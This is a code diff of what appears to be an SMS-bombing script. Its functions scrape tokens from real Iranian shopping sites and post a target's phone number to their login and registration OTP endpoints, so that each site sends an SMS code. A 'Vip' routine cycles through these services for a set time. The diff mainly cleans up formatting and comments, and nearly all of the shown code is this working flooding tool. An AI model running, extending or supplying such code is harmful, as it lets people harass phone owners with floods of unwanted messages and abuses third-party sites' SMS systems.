@@ -46,16 +46,12 @@ def check_internet():
 # ------------------------------
 # SMS services
 # ------------------------------
-
-
-
-
- def katonikhan(phone):
+def katonikhan(phone):
     import requests
     import re
     
     digits_phone = phone.replace("+98", "")
-    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"  # با + بین اعداد
+    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
     
     try:
         session = requests.Session()
@@ -64,17 +60,15 @@ def check_internet():
         # استخراج instance_id
         instance_id = None
         instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
-        match = re.search(instance_pattern, home_response.text)
-        if match:
-            instance_id = match.group(1)
-        
+        match_obj = re.search(instance_pattern, home_response.text)
+        if match_obj:
+            instance_id = match_obj.group(1)
         if not instance_id:
             instance_id = "c1866f4215f82aaedb42ab38190ef1fa"
         
         url = "https://katonikhan.com/wp-admin/admin-ajax.php"
-        
         payload = {
-            "phone": formatted_phone,  # با + بین اعداد: 917+364+4430
+            "phone": formatted_phone,
             "digt_countrycode": "+98",
             "digits_process_register": "1",
             "instance_id": instance_id,
@@ -88,7 +82,6 @@ def check_internet():
             "digits_form": "92e2d882a6",
             "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F"
         }
-        
         headers = {
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -96,10 +89,8 @@ def check_internet():
             "Origin": "https://katonikhan.com",
             "Referer": "https://katonikhan.com/",
         }
-        
         response = session.post(url, data=payload, headers=headers, timeout=10)
         
-        # دیباگ: نمایش پاسخ سرور
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
         
@@ -110,22 +101,15 @@ def check_internet():
                     print(f'{g}(katonikhan) {a}Code Sent')
                     return True
             except:
-                # اگر پاسخ JSON نبود
                 if "1" in response.text or "success" in response.text.lower():
                     print(f'{g}(katonikhan) {a}Code Sent')
                     return True
         
         print(f'{r}[-] (katonikhan) Failed{a}')
         return False
-            
     except Exception as e:
         print(f'{r}[!] katonikhan Exception: {e}{a}')
         return False
-
-
-
-
-
 
 def katoonistore(phone):
     import requests
@@ -137,18 +121,15 @@ def katoonistore(phone):
         session = requests.Session()
         home_response = session.get("https://katoonistore.ir/", timeout=10)
         
-        # استخراج instance_id
         instance_id = None
         instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
-        match = re.search(instance_pattern, home_response.text)
-        if match:
-            instance_id = match.group(1)
-        
+        match_obj = re.search(instance_pattern, home_response.text)
+        if match_obj:
+            instance_id = match_obj.group(1)
         if not instance_id:
             instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
         
         url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
-        
         payload = {
             "digits_reg_name": "م",
             "digt_countrycode": "+98",
@@ -172,7 +153,6 @@ def katoonistore(phone):
             "container": "digits_protected",
             "sub_action": "sms_otp"
         }
-        
         headers = {
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -180,7 +160,6 @@ def katoonistore(phone):
             "Origin": "https://katoonistore.ir",
             "Referer": "https://katoonistore.ir/",
         }
-        
         response = session.post(url, data=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
@@ -191,16 +170,9 @@ def katoonistore(phone):
         
         print(f'{r}[-] (katoonistore) Failed{a}')
         return False
-            
     except Exception:
         print(f'{r}[-] (katoonistore) Failed{a}')
         return False
-
-
-
-
-
-
 
 def hajamooo(phone):
     import requests
@@ -219,13 +191,11 @@ def hajamooo(phone):
             r'name="csrf" value="([a-f0-9]+)"',
             r'var nonce = "([a-f0-9]+)"',
         ]
-        
         for pattern in nounce_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                nounce_value = match.group(1)
+            match_obj = re.search(pattern, home_response.text)
+            if match_obj:
+                nounce_value = match_obj.group(1)
                 break
-        
         if not nounce_value:
             nounce_value = "34bcba36e0"
         
@@ -247,7 +217,6 @@ def hajamooo(phone):
             "dig_otp": "",
             "dig_nounce": nounce_value
         }
-        
         headers = {
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -255,7 +224,6 @@ def hajamooo(phone):
             "Origin": "https://hajamooo.ir",
             "Referer": "https://hajamooo.ir/",
         }
-        
         response = session.post(url, data=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
@@ -266,13 +234,9 @@ def hajamooo(phone):
         
         print(f'{r}[-] (hajamooo) Failed{a}')
         return False
-            
     except Exception:
         print(f'{r}[-] (hajamooo) Failed{a}')
         return False
-
-
-
 
 def digikala(phone):
     url = "https://api.digikala.com/v1/user/authenticate/"
@@ -304,7 +268,6 @@ def Vip(phone, Time):
         hajamooo,
         katoonistore,
         katonikhan,
-        # سرویس‌های دیگه بعداً اینجا اضافه میشن
     ]
     total_services = len(services)
 
